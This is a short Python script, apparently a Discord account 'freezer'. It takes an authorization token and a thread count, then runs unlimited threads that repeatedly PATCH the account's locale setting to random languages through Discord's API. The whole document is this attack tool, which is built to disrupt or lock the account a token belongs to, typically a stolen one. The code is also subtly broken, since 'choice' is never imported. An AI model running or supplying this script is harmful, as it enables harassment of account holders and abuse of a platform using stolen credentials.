from httpx import patch as Yed_Tud
from threading import Thread as Yed_Hee
token = input("Token : ")
thread = input("Threads : ")
lo = ["da","de","en-GB","en-US","es-ES","fr","hr","it","lt","hu","nl","no","pl","pt-BR","ro","fi","sv-SE","vi","tr","cs","el","bg","ru","uk","hi","th","zh-CN","ja","zh-TW","ko"]
def _Freeze_token_():
    while True:
        r = Yed_Tud("https://discord.com/api/v9/users/@me/settings",headers={"authorization": token},json={"locale":choice(lo)})
        print(r.json()['locale'])
def _Freeze_():
    for i in range(int(thread)):
        Yed_Hee(target=_Freeze_token_).start()
_Freeze_()